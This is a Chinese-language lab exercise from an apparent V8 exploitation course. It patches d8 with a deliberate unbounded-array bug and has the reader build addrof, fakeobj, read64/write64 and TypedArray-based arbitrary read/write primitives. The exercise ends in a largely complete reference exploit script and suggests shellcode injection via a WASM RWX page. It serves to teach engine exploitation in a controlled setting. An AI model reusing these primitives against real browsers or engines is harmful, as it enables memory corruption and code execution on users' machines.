# 練習 B — 從 OOB 到任意讀寫

> **目標**：把 Part 3（[Ch 14](./14-first-oob.md)–[Ch 18](./18-oob-to-arbitrary-rw.md)）的整套原語鏈**親手打一遍**。給你一顆「challenge patch」過的 d8（人工植入一個 JSArray OOB），你要從這個越界能力，一路做出 `addrof` / `fakeobj` → `read64` / `write64` → 穩定 TypedArray R/W。做完這題，[Ch 18](./18-oob-to-arbitrary-rw.md) 的 template 就從「看得懂」變成「閉眼默得出」的肌肉記憶——這是進 Part 4（真 bug）的入場券。

> **環境**：V8 15.3.0（candidate）、git commit `ab2cad06`。sandbox on = `~/v8build/v8/out/x64.release/d8`；off = `~/v8build/v8/out/x64.release.nosbx/d8`。**你要先套一個 challenge patch 並重編 d8**（步驟見下）。**可驗證的中間步驟（IEEE754、%DebugPrint 佈局）在乾淨 d8 就能真跑；完整 exploit 需 patch build，本 batch 未提供該 build，參考解答標「理論預期」，位址每跑不同、對結構不對數字。**

## 為什麼做這題

Part 3 的四章你讀了一堆 template，但**讀懂和打通是兩回事**。真正卡人的從來不是概念（「double 陣列存位元、object 陣列存指標」誰都會背），而是：

- fake array 的**欄位打包**——一個 8-byte double 蓋兩個 4-byte 壓縮欄位，順序、tag、SMI 編碼差一位就崩。
- **offset 的 -8**——FixedDoubleArray 的 element[0] 在 header offset 0x8，忘了減 8 讀寫全偏。
- **fakeobj 位址的 tag**——不加 tag，V8 把它當 SMI，整個崩。
- **sandbox on/off 的分野**——同一段劫持碼，off 給你進程級 R/W、on 卡 cage 內，第一次撞牆會懵。

這些坑,你不親手踩一遍、看 V8 怎麼崩，永遠是「知道但不會」。這題就是逼你踩完所有坑,把 [Ch 18](./18-oob-to-arbitrary-rw.md) 的骨架填成一份**你自己能跑起來的 exploit**。

## 題目規格

### 給定的 challenge patch（你要套的 bug）

出題者在 `Array.prototype` 加了一個**不檢查邊界**的 double 越界讀寫方法 `oob`（[Ch 14](./14-first-oob.md) 手法一）。這是你唯一的越界能力，其餘 d8 乾淨。

**patch 內容**（你要自己套上並重編）:

在 `~/v8build/v8/src/builtins/builtins-array.cc` 加一個 builtin:

```cpp
BUILTIN(ArrayOob) {
  HandleScope scope(isolate);
  Handle<JSArray> a = Handle<JSArray>::cast(args.receiver());
  if (!a->elements().IsFixedDoubleArray()) {
    return ReadOnlyRoots(isolate).undefined_value();
  }
  Handle<FixedDoubleArray> e(
      FixedDoubleArray::cast(a->elements()), isolate);
  double idx = args.atOrUndefined(isolate, 1)->Number();
  int i = static_cast<int>(idx);
  if (args.length() >= 3) {                       // oob(i, v) → 寫
    double v = args.atOrUndefined(isolate, 2)->Number();
    e->set(i, v);                                 // ★ 無 bounds check
    return ReadOnlyRoots(isolate).undefined_value();
  }
  return *isolate->factory()->NewNumber(e->get_scalar(i));  // oob(i) → 讀
}
```

在 `~/v8build/v8/src/init/bootstrapper.cc` 的 array prototype 安裝區塊加一行掛載:

```cpp
SimpleInstallFunction(isolate_, proto, "oob", Builtins::kArrayOob, 1, false);
```

**重編**:

```
cd ~/v8build/v8
autoninja -C out/x64.release d8            # sandbox on
autoninja -C out/x64.release.nosbx d8      # sandbox off（同 patch）
```

`autoninja` 只重編動到的檔,約數分鐘。

### 你的越界能力（bug 規格）

- 對一個 `PACKED_DOUBLE` 陣列 `a`，`a.oob(i)` = 讀 `a.elements` 的第 `i` 個 double（**不檢查 `i < length`**，也接受負 `i`）。
- `a.oob(i, v)` = 把 double `v` 寫到第 `i` 個位置（同樣不檢查）。
- 越界單位是 **double（8 bytes）**、相對 `a.elements` 的 element[0]。

### 通關條件（分階段）

1. **階段 1（可在乾淨 d8 驗證）**：實作 `ftoi`/`itof`，驗證 roundtrip 無損。
2. **階段 2**：用 `oob` 建立 `addrof`——洩漏任意物件位址，`%DebugPrint` 對照一致。
3. **階段 3**：建立 `fakeobj`——把一個受控位址當物件，`%DebugPrint` 看 V8 照你的假 map 解讀。
4. **階段 4**：建立 `read64`/`write64`（cage 內任意讀寫），驗證 `read64(addrof(probe))` 讀出 probe 的 map。
5. **階段 5**：劫持一個 TypedArray 的 data_ptr，得到穩定 `aar`/`aaw`。**在 sandbox off build 驗證進程級 R/W；在 sandbox on build 觀察卡在 cage 內。**

## 測試組（自我驗收）

每階段跑對應測試,全綠才算通關:

```js
// 測試 1：IEEE754（乾淨 d8 就能過）
assert(ftoi(1.5) === 0x3ff8000000000000n, "ftoi 1.5");
assert(itof(0x401199999999999an) === 4.4, "itof 4.4");
assert(ftoi(itof(0xdeadbeefcafebaben)) === 0xdeadbeefcafebaben, "roundtrip");

// 測試 2：addrof（需 patch）
let o1 = {}, o2 = {};
assert(addrof(o1) !== addrof(o2), "不同物件不同位址");
assert((addrof(o1) & 1n) === 1n, "位址帶 HeapObject tag");
// %DebugPrint(o1) 對照低 32 bit 一致

// 測試 3：fakeobj（需 patch）
let d = [1.1, 2.2];           // double 陣列
let d_addr = addrof(d);
// fakeobj(某個排好 map 的位址) 不崩、%DebugPrint 顯示你的假型別

// 測試 4：read64/write64（需 patch）
let probe = {mark: 1.234};
let paddr = addrof(probe);
let map_via_rw = read64(paddr) & 0xffffffffn;
// map_via_rw 應等於 %DebugPrint(probe) 的 map 低 32 bit
let tgt = [13.37];
write64(addrof(tgt) + 8n, itof(...));   // 改 tgt 的 properties/elements，觀察效果

// 測試 5：TypedArray 劫持（需 patch）
let ta = new Float64Array(0x100);
// sandbox off：aar(一個已知進程位址) 讀到預期值
// sandbox on ：同段卡 cage 內，讀不到 cage 外
```

輔助 `assert`:

```js
function assert(cond, msg) {
  if (!cond) { print("[FAIL] " + msg); throw new Error(msg); }
  print("[ OK ] " + msg);
}
```

## 卡點提示（卡住再看,別偷跑）

<details>
<summary>提示 1：addrof 讀出來的位址「怪怪的」不像位址</summary>

你 addrof 讀出的是一個 **double**,要 `ftoi` 轉成整數才是位址。而且它是 **cage 內壓縮 tagged 位址**(低 32 bit 是壓縮 offset、最低位是 tag)。和 `%DebugPrint` 印的比,`%DebugPrint` 印 `0x5820104b3bd`——你 addrof 讀出的低 32 bit 應該是 `0x0104b3bd`(去掉 cage base 高位)。對的是**低 32 bit**,不是完整值。
</details>

<details>
<summary>提示 2：怎麼找到 obj 陣列的 map 欄位在 oob 的第幾格</summary>

用 [Ch 14](./14-first-oob.md) 練習的掃法:`for (i=4; i<30; i++) print(i, ftoi(dbl.oob(i)).toString(16))`。你會看到某格低 32 bit 長得像壓縮 map(`0x..cfc9`/`0x..d051`),某格像 SMI length(`0x4`=length 2)。認出「哪格是相鄰 object 陣列的 map」就是你的著力點。young space 線性配置,兩陣列相鄰,offset 每次執行大致固定(同一 build)。
</details>

<details>
<summary>提示 3：fakeobj 一呼叫就崩</summary>

fakeobj 給的位址**必須指向你已經排好合法 map 的記憶體**,且要**帶 tag**(`| 1n`)。V8 一拿到就去讀那位址 offset 0 的 map。如果你指到亂記憶體、或忘了加 tag(被當 SMI),立刻崩。正確做法:先在一個 double 陣列裡把「假物件的 map」寫到某格,fakeobj 指向那格的位址(帶 tag)。
</details>

<details>
<summary>提示 4：read64 讀出來全是 0 或崩</summary>

檢查三件事:(1) fake array 的 **elements 指標填的是 `addr - 8`**(FixedDoubleArray element[0] 在 offset 0x8),不是 `addr`。(2) **length 填夠大且是 SMI 編碼**(想要 0x1000 填 `0x2000` 打包進高 32 bit)。(3) **打包順序**:一個 double 蓋兩欄,低 4 bytes=低 offset 欄位(elements),高 4 bytes=高 offset 欄位(length),小端序別搞反。
</details>

<details>
<summary>提示 5：sandbox on 時 TypedArray 劫持「改了 data_ptr 卻讀不到 libc」</summary>

這不是 bug,是 **sandbox 的設計**([Ch 17](./17-typedarray-attack.md))。sandbox on 時 data_ptr 是 external pointer table 的 handle,你改的是 index,指不到任意進程位址。**這題 sandbox on build 到「cage 內任意讀寫」就是通關上限**,出 cage 是 Part 5([Ch 34](./34-v8-sandbox.md))的事。想看進程級 R/W,跑 sandbox off build。
</details>

## 延伸挑戰(通關後加菜)

1. **改用「別名共用 elements」路徑**(路徑 B,[Ch 15](./15-addrof-fakeobj.md)):不靠每次改 map,而是用 oob 把一個 double 陣列的 elements 指標改成指向 object 陣列的 elements,達成天然 confusion。比較它和「改 map」路徑的穩定性。
2. **穩定化**:把 controller/fake array 用的陣列想辦法晉升 old space(避免 GC 搬動),讓 exploit 重跑穩定不崩。觀察 `--trace-gc` 有沒有在關鍵時刻搬你的物件。
3. **cage 內 code exec**:sandbox on 卡 cage 內,但你能改 heap 上任何東西。試著用 read64/write64 定位一個 WASM instance 的 RWX 頁([Ch 33](./33-wasm-rwx-jit-spray.md)),往裡寫 shellcode、劫持執行——證明「cage 內 R/W」不破 sandbox 也能 code exec。
4. **把 template 模組化**:把你的 `ftoi/itof/addrof/fakeobj/read64/write64/aar/aaw` 抽成一份 `v8_prelude.js`,下一題(練習 C)直接 import。這是你 CTF 生涯的第一份個人武器庫。

## 參考解答

<details>
<summary>完整 exploit.js(理論預期,需套 challenge patch 並重編)</summary>

> **未實測,理論預期**。本 batch 未提供 patch build。**階段 1(IEEE754)在乾淨 d8 已真跑驗證**(見 [Ch 15](./15-addrof-fakeobj.md));階段 2–5 需套上面的 challenge patch 重編 d8 才能跑。位址每次執行不同,程式碼對的是結構。不捏造成功輸出。

```js
// ============================================================
//  練習 B 參考解答 — challenge patch OOB → arbitrary R/W
//  V8 15.3.0 (ab2cad06), pointer compression on
//  bug: Array.prototype.oob(i[, v]) 對 FixedDoubleArray 無 bounds check
// ============================================================

function assert(c, m) { if (!c) { print("[FAIL] " + m); throw new Error(m); }
                        print("[ OK ] " + m); }

// --- 階段 1：IEEE754 位元互轉(乾淨 d8 可真跑驗證)---
let _buf = new ArrayBuffer(8);
let _f64 = new Float64Array(_buf);
let _u64 = new BigUint64Array(_buf);
function ftoi(f) { _f64[0] = f; return _u64[0]; }
function itof(i) { _u64[0] = i; return _f64[0]; }
function pak(lo32, hi32) {            // 把兩個 32-bit 壓縮欄位打包成一個 double
  return itof((BigInt(hi32) << 32n) | (BigInt(lo32) & 0xffffffffn));
}

assert(ftoi(1.5) === 0x3ff8000000000000n, "ftoi(1.5)");
assert(itof(0x401199999999999an) === 4.4, "itof(4.4)");
assert(ftoi(itof(0xdeadbeefcafebaben)) === 0xdeadbeefcafebaben, "roundtrip");

// --- 準備:兩個相鄰陣列,dbl 是 OOB 載體、obj 是受害 object 陣列 ---
let dbl = [1.1, 2.2, 3.3, 4.4];      // PACKED_DOUBLE(oob 載體)
let obj = [{}, {}];                  // PACKED_ELEMENTS(緊鄰在後)

// 掃出 obj 的 map 欄位在 oob 的第幾格(同 build 大致固定,提示 2)
// 這裡示意:實跑時 print 出來認,填入常數
let IDX_OBJ_MAP = /* 掃出來的格數,例如 8 */ 8;

// 一次性洩漏:obj 的 map(PACKED_ELEMENTS map)與 dbl 的 map(PACKED_DOUBLE map)
let OBJ_MAP = ftoi(dbl.oob(IDX_OBJ_MAP)) & 0xffffffffn;   // 相鄰 obj 陣列的 map
// dbl 自己的 map:oob(-1 附近能讀到自己 header,或先記真 double 陣列的 map)
let DBL_MAP = /* 洩漏出的 PACKED_DOUBLE map,例如 0x0100cfc9 */ 0x0100cfc9n;
let EMPTY_PROP = /* 空 FixedArray 的壓縮值,例如 0x000007e5 */ 0x000007e5n;

// --- 階段 2：addrof(改 map 路徑 A)---
function addrof(o) {
  obj[0] = o;                                    // o 的指標進 obj.elements[0]
  dbl.oob(IDX_OBJ_MAP, itof(DBL_MAP));           // 把 obj 的 map 換成 double map
  let leak = ftoi(obj[0]);                       // 現在 obj 被當 double 讀 → 指標位元
  dbl.oob(IDX_OBJ_MAP, itof(OBJ_MAP));           // ★ 復原,否則 GC 一碰崩
  return leak;
}
// 驗證
let o1 = {}, o2 = {};
assert(addrof(o1) !== addrof(o2), "addrof 不同物件不同位址");
assert((addrof(o1) & 1n) === 1n, "addrof 帶 tag");

// --- 階段 3：fakeobj(改 map 路徑 A 的逆)---
function fakeobj(addr) {
  dbl.oob(IDX_OBJ_MAP, itof(DBL_MAP));           // 把 obj 當 double 陣列
  obj[0] = itof(addr);                           // 把 addr 位元寫進去(當 double 存)
  dbl.oob(IDX_OBJ_MAP, itof(OBJ_MAP));           // 復原成 object 陣列
  return obj[0];                                 // 讀出時 V8 把 addr 當物件指標
}

// --- 階段 4：read64 / write64(fake JSArray)---
// controller:一個 double 陣列,我們在它 elements 裡排 fake JSArray
let controller = [
  pak(DBL_MAP, EMPTY_PROP),   // [0]: map(lo) | properties(hi)
  pak(0, 0),                  // [1]: elements(lo) | length(hi) ← 動態改
  1.1, 2.2, 3.3, 4.4,
];
let controller_elems = addrof(controller) /* +elements 欄位讀取 */;
// fake array 位址 = controller 的 elements backing store 的 element[0] 位址(帶 tag)
let FAKE_LEN_SMI = 0x1000n << 1n;                // length=0x1000 的 SMI 編碼
let fake_arr = fakeobj(/* controller_elems + 8 + tag */ );

function read64(addr) {
  // 把 fake_arr.elements 指向 addr-8(element[0] 在 header +8)
  controller[1] = pak(Number((addr - 8n) & 0xffffffffn), Number(FAKE_LEN_SMI));
  return ftoi(fake_arr[0]);
}
function write64(addr, val) {
  controller[1] = pak(Number((addr - 8n) & 0xffffffffn), Number(FAKE_LEN_SMI));
  fake_arr[0] = itof(val);
}
// 驗證:read64 讀出 probe 的 map
let probe = {mark: 1.234};
let map_rw = read64(addrof(probe) & ~1n) & 0xffffffffn;
// map_rw 應等於 %DebugPrint(probe) 的 map 低 32 bit

// --- 階段 5：劫持 TypedArray 的 data_ptr → 穩定 R/W ---
let ta = new Float64Array(0x100);
let ta_addr = addrof(ta) & ~1n;
let DATA_PTR_OFF = /* JSTypedArray 的 data_ptr 欄位 offset,%DebugPrint/原始碼取得 */ 0x1cn;

function aar(addr) {                              // 穩定 arbitrary read
  write64(ta_addr + DATA_PTR_OFF, addr);         // sandbox off:改成任意位址
  return ftoi(ta[0]);
}
function aaw(addr, val) {                         // 穩定 arbitrary write
  write64(ta_addr + DATA_PTR_OFF, addr);
  ta[0] = itof(val);
}
// sandbox off build:aar(已知進程位址) 讀到預期值(進程級 R/W)
// sandbox on  build:同段卡 cage 內(data_ptr 是 handle,提示 5)

print("[*] primitives ready. sandbox off → 進程級 R/W;sandbox on → cage 內 R/W");
```

**關於參考解答裡的常數**(`IDX_OBJ_MAP`、`DBL_MAP`、`EMPTY_PROP`、`DATA_PTR_OFF`、controller_elems 定位):這些**每個都要你自己在套 patch 的 build 上真跑 `%DebugPrint`/掃 oob 取得**,不是抄就通。這正是本題的訓練點——**exploit 的值一律 runtime/現查,對的是結構**([Ch 18](./18-oob-to-arbitrary-rw.md))。我刻意把它們留成 `/* 你填 */`,逼你動手。

**兩條路徑的取捨**:上面 addrof/fakeobj 用「改 map 路徑 A」示範(最透明,看得見 map confusion)。實務更穩的是「別名路徑 B」(延伸挑戰 1)——不用每次改 map/復原,用 oob 讓 dbl 和 obj 別名到同一塊 elements,addrof/fakeobj 就退化成 [Ch 15](./15-addrof-fakeobj.md) 的四行。通關後務必改寫成 B 對比穩定性。
</details>

<details>
<summary>常見錯誤與對應崩潰現象(對照你的失敗)</summary>

| 你看到的現象 | 最可能的錯 | 修 |
|---|---|---|
| addrof 讀出的值不像位址(超大浮點) | 忘了 `ftoi` / 對成完整值而非低 32 bit | 用 `ftoi`,比對低 32 bit |
| addrof 後隨機 crash | 忘了把 obj 的 map **復原** | 讀完立刻 `oob(IDX, itof(OBJ_MAP))` |
| fakeobj 一呼叫就 SIGSEGV | 位址沒帶 tag / 指到沒排 map 的記憶體 | `| 1n`,且先排好假 map |
| read64 讀出全 0 / 偏 8 bytes | elements 指標沒 `-8` | 填 `addr - 8` |
| read64 讀到的 length 一半大小 | length 沒 SMI 編碼 | 填 `value << 1` |
| fake array 讀到亂值 | map/properties 打包順序反了 | 低 4B=map、高 4B=properties(小端) |
| sandbox on 劫持 data_ptr 讀不到 libc | 正常,handle 機制 | 跑 sandbox off,或到此為止 |
</details>

## 驗收清單

- [ ] 階段 1:`ftoi`/`itof` roundtrip 無損(乾淨 d8 真跑過)
- [ ] 階段 2:`addrof` 洩漏位址,`%DebugPrint` 低 32 bit 對照一致,且讀完有復原 map
- [ ] 階段 3:`fakeobj` 造出物件不崩,`%DebugPrint` 照假 map 解讀
- [ ] 階段 4:`read64(addrof(probe))` 讀出 probe 的 map,與 `%DebugPrint` 一致;`write64` 能改物件欄位
- [ ] 階段 5(sandbox off):`aar`/`aaw` 讀寫進程任意位址
- [ ] 階段 5(sandbox on):親眼確認同段卡在 cage 內,理解 handle 機制
- [ ] 延伸:改寫成「別名路徑 B」並比較穩定性
- [ ] 把 primitives 抽成 `v8_prelude.js`

## 你學到了什麼

打通這題,你手上就有了一份**能重用的 exploit 骨架**和**踩過所有坑的肌肉記憶**:

- 你親手驗證了「double 陣列存位元、object 陣列存指標,差別只在 map」不是口號——你用它造出了 addrof/fakeobj。
- 你踩過 fake array 的每個坑(打包、-8、tag、SMI 編碼),之後看任何 V8 exploit 的 primitive 段都秒懂。
- 你**親眼撞了 sandbox 的牆**:同一段劫持碼,sandbox off 進程級 R/W、sandbox on 卡 cage 內。這個體感是你判斷「一題還要多長」的直覺來源([Ch 18](./18-oob-to-arbitrary-rw.md))。
- 你有了一份 `v8_prelude.js`。Part 4 學會生真 bug 後,你只要把「OOB 來源」那格換成真 TurboFan confusion,整份 prelude 照用。

**這就是 Part 3 的全部意義**:把「地基原語」一次練到骨子裡,之後 Part 4/5 只在最前(生 bug)和最後(出 cage、code exec)加料,中間這套 addrof→fakeobj→R/W 永遠是你的。

## 延伸閱讀

- **[saelo “Attacking JavaScript Engines” — Phrack 0x46](http://www.phrack.org/issues/70/3.html)**
  - **這篇說什麼**:addrof/fakeobj/fake object 的奠基建構,和你這題走的路完全同源。
  - **讀哪裡**:primitive 建構全段。卡在階段 2/3 時對照。
  - **關聯**:你這題的思想母本。
- **[faraz.faith / doar-e 的現代 V8 exploit writeup(pointer compression 後)](https://faraz.faith/)**
  - **這篇說什麼**:壓縮下 fake array 的欄位打包、tag、offset 實作細節——你階段 4 最容易錯的地方。
  - **讀哪裡**:read64/write64 實作與 offset 處理段落。
  - **關聯**:補足你參考解答裡那些 `/* 你填 */` 常數的取得方法。
- **[V8 `src/objects/js-array.h` / `js-array-buffer.h` / `fixed-array.h`](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/js-array.h)**
  - **這篇說什麼**:JSArray/JSTypedArray/FixedDoubleArray 的欄位 offset——你算 `DATA_PTR_OFF`、elements offset、-8 的依據。
  - **讀哪裡**:各結構的 `kXxxOffset` 常數。
  - **關聯**:綁死 commit `ab2cad06`;換版本重測,正是本題「值現查」的精神。

Part 3 到此完整:你有了原語、有了 template、有了踩過坑的手感。但你一直在用「作弊的 challenge patch」當 OOB 來源。真正的功夫是**自己生一個 OOB**——讓 TurboFan 對型別的推測出錯,產生一個它以為安全、實則越界的陣列。這是 Part 4 的主戲,也是把你和「只會抄 exploit」的人區分開的分水嶺。

→ [Ch 19 — TurboFan 型別混淆:第一個真 bug](./19-turbofan-type-confusion.md)
